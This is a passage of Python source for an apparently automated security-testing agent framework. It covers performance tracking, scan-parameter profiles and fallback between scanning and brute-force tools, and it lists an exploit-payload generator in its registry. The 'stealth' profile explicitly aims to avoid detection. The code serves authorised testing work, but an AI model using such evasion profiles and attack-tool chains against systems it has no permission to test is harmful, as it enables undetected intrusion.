            "success_rate": round(stats["successes"] / stats["total_runs"], 3),
            "avg_duration": round(stats["total_duration"] / stats["total_runs"], 3),
            "max_duration": stats["max_duration"],
            "peak_memory_mb": stats["peak_memory_mb"],
        }

    def get_summary(self) -> dict:
        total = len(self.metrics["executions"])
        successes = sum(1 for e in self.metrics["executions"] if e["success"])
        durations = [e["duration"] for e in self.metrics["executions"]]
        return {
            "total_executions": total,
            "overall_success_rate": round(successes / total, 3) if total else 0.0,
            "avg_duration": round(sum(durations) / len(durations), 3) if durations else 0.0,
            "agents_tracked": list(self.metrics["agent_stats"].keys()),
        }

    def get_slow_agents(self, threshold: float = 5.0) -> list[dict]:
        """Return agents whose average duration exceeds *threshold* seconds."""
        slow = []
        for name in self.metrics["agent_stats"]:
            stats = self.get_agent_stats(name)
            if stats.get("avg_duration", 0.0) > threshold:
                slow.append(stats)
        return slow

    async def _reason(self, prompt: str) -> str:
        summary = self.get_summary()
        return (
            f"Tracking {summary['total_executions']} executions across "
            f"{len(summary['agents_tracked'])} agents. "
            f"Overall success rate: {summary['overall_success_rate']:.1%}."
        )

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        return None, {}

    async def execute(self, context: dict) -> dict:
        self.context.update(context)
        events = context.get("events", [])
        for ev in events:
            self.record_execution(
                agent_name=ev.get("agent", "unknown"),
                duration=ev.get("duration", 0.0),
                success=ev.get("success", True),
                memory_mb=ev.get("memory_mb", 0.0),
            )

        thought = await self.think(context.get("task", "performance check"))
        summary = self.get_summary()
        slow = self.get_slow_agents()
        return {
            "status": "completed",
            "findings": {"summary": summary, "slow_agents": slow},
            "recommendations": [
                f"Optimise {s['agent']} (avg {s['avg_duration']:.1f}s)" for s in slow
            ] or ["All agents within performance thresholds"],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# 11. ParameterOptimizer
# ---------------------------------------------------------------------------

@dataclass
class ParameterOptimizer(Agent):
    """Optimizes tool parameters based on target context and historical results.

    Uses a simple scoring heuristic over previous outcomes to recommend optimal
    parameter values for subsequent runs.
    """

    param_history: list = field(default_factory=list)

    DEFAULT_PROFILES: dict = field(default_factory=lambda: {
        "stealth": {
            "description": "Low-noise scanning to avoid detection",
            "params": {
                "rate": 10,
                "threads": 1,
                "timeout": 10,
                "retries": 1,
                "delay": 2.0,
                "user_agent": "Mozilla/5.0 (compatible)",
            },
        },
        "balanced": {
            "description": "Balanced speed and noise footprint",
            "params": {
                "rate": 100,
                "threads": 5,
                "timeout": 5,
                "retries": 2,
                "delay": 0.5,
                "user_agent": "Mozilla/5.0 (compatible)",
            },
        },
        "aggressive": {
            "description": "Maximum speed, higher detection risk",
            "params": {
                "rate": 1000,
                "threads": 20,
                "timeout": 3,
                "retries": 3,
                "delay": 0.0,
                "user_agent": "SecurityScanner/1.0",
            },
        },
    })

    def select_profile(self, context: dict) -> str:
        """Choose a profile name based on context hints."""
        if context.get("stealth") or context.get("evasion"):
            return "stealth"
        if context.get("fast") or context.get("aggressive"):
            return "aggressive"
        return "balanced"

    def get_optimized_params(self, tool_name: str, context: dict) -> dict:
        profile_name = self.select_profile(context)
        base = dict(self.DEFAULT_PROFILES[profile_name]["params"])

        # Adjust based on historical success for this tool
        relevant = [h for h in self.param_history if h.get("tool") == tool_name]
        if relevant:
            successes = [h for h in relevant if h.get("success")]
            if successes:
                last_good = successes[-1].get("params", {})
                for key in ("rate", "threads", "timeout"):
                    if key in last_good:
                        base[key] = last_good[key]

        return {"profile": profile_name, "tool": tool_name, "params": base}

    def record_result(self, tool_name: str, params: dict, success: bool) -> None:
        self.param_history.append({
            "tool": tool_name,
            "params": params,
            "success": success,
            "timestamp": datetime.now().isoformat(),
        })

    async def _reason(self, prompt: str) -> str:
        profile = self.select_profile(self.context)
        return f"Selected '{profile}' optimisation profile. History: {len(self.param_history)} runs."

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        return None, {}

    async def execute(self, context: dict) -> dict:
        self.context.update(context)
        tool_name = context.get("tool", "generic")
        thought = await self.think(context.get("task", "optimise"))
        optimized = self.get_optimized_params(tool_name, context)

        results = context.get("results", [])
        for r in results:
            self.record_result(r.get("tool", tool_name), r.get("params", {}), r.get("success", True))

        return {
            "status": "completed",
            "findings": optimized,
            "recommendations": [
                f"Use profile '{optimized['profile']}' for {tool_name}",
                f"Rate: {optimized['params']['rate']}, Threads: {optimized['params']['threads']}",
            ],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# 12. GracefulDegradation
# ---------------------------------------------------------------------------

@dataclass
class GracefulDegradation(Agent):
    """Provides fault-tolerant operation by falling back to alternative tools.

    When a primary tool fails, this agent transparently selects an alternative
    and re-routes execution, keeping the overall workflow running.
    """

    TOOL_ALTERNATIVES: dict = field(default_factory=lambda: {
        "nmap": ["masscan", "rustscan", "zmap"],
        "sqlmap": ["ghauri", "nosqlmap"],
        "ffuf": ["gobuster", "feroxbuster", "dirsearch"],
        "nuclei": ["nikto", "zap", "wapiti"],
        "subfinder": ["amass", "dnsx", "sublist3r"],
        "nikto": ["nuclei", "zap"],
        "amass": ["subfinder", "dnsx"],
        "hydra": ["medusa", "ncrack", "patator"],
        "metasploit": ["manual_exploit"],
        "burpsuite": ["zap", "caido"],
    })

    degradation_log: list = field(default_factory=list)

    def find_alternative(self, failed_tool: str,
                         already_tried: list[str] | None = None) -> Optional[str]:
        """Return the first healthy alternative for *failed_tool*."""
        tried = set(already_tried or [])
        tried.add(failed_tool)
        for alt in self.TOOL_ALTERNATIVES.get(failed_tool, []):
            if alt not in tried:
                return alt
        return None

    def degrade(self, failed_tool: str, error: str = "",
                already_tried: list[str] | None = None) -> dict:
        """Attempt graceful degradation – returns an action plan."""
        alternative = self.find_alternative(failed_tool, already_tried)
        entry = {
            "timestamp": datetime.now().isoformat(),
            "failed_tool": failed_tool,
            "error": error,
            "alternative": alternative,
            "status": "degraded" if alternative else "failed",
        }
        self.degradation_log.append(entry)

        if alternative:
            return {
                "action": "switch",
                "from_tool": failed_tool,
                "to_tool": alternative,
                "message": f"Switching from {failed_tool} to {alternative}",
            }
        return {
            "action": "abort",
            "from_tool": failed_tool,
            "to_tool": None,
            "message": f"No alternatives available for {failed_tool}",
        }

    def get_degradation_history(self) -> list[dict]:
        return list(self.degradation_log)

    async def _reason(self, prompt: str) -> str:
        total_events = len(self.degradation_log)
        return f"Degradation monitor active. {total_events} fallback event(s) recorded."

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        return None, {}

    async def execute(self, context: dict) -> dict:
        self.context.update(context)
        failures = context.get("failures", [])
        plans: list[dict] = []
        for f in failures:
            plan = self.degrade(
                failed_tool=f.get("tool", ""),
                error=f.get("error", ""),
                already_tried=f.get("already_tried", []),
            )
            plans.append(plan)

        thought = await self.think(context.get("task", "graceful degradation"))
        return {
            "status": "completed",
            "findings": {"degradation_plans": plans, "history": self.degradation_log},
            "recommendations": [
                p["message"] for p in plans
            ] or ["All tools operational – no degradation needed"],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# Registry helper
# ---------------------------------------------------------------------------

def get_all_ai_agents() -> dict[str, str]:
    """Return a mapping of agent class names to their descriptions."""
    return {
        "IntelligentDecisionEngine": (
            "Analyzes task context and selects optimal tools/parameters using a strategy map"
        ),
        "BugBountyWorkflowManager": (
            "Manages end-to-end bug bounty workflows across recon, enumeration, "
            "discovery, scanning, and exploitation validation phases"
        ),
        "CTFWorkflowManager": (
            "Manages CTF challenge solving with per-category strategies "
            "(web, crypto, pwn, forensics, misc)"
        ),
        "CVEIntelligenceManager": (
            "Tracks, searches, and correlates CVE intelligence with severity scoring "
            "and exploit suggestions"
        ),
        "AIExploitGenerator": (
            "Generates exploit payloads from templates for common vulnerability classes "
            "(SQLi, XSS, SSTI, LFI, RCE, SSRF)"
        ),
        "VulnerabilityCorrelator": (
            "Correlates vulnerabilities across scan results to discover multi-step "
            "attack chains and critical paths"
        ),
        "TechnologyDetector": (
            "Identifies technology stacks from scan data and maps them to known CVEs"
        ),
        "RateLimitDetector": (
            "Detects rate limiting via HTTP status codes and headers, then adapts "
            "request timing with exponential back-off"
        ),
        "FailureRecoverySystem": (
            "Handles tool failures with automatic retries, exponential back-off, "
            "and fallback tool selection"
        ),
        "PerformanceMonitor": (
            "Monitors agent execution times, success rates, and resource usage "
            "to identify performance bottlenecks"
        ),
        "ParameterOptimizer": (
            "Optimizes tool parameters based on target context and historical outcomes "
            "using stealth/balanced/aggressive profiles"
        ),
        "GracefulDegradation": (
            "Provides fault-tolerant operation by transparently switching to "
            "alternative tools when primary tools fail"
        ),
    }
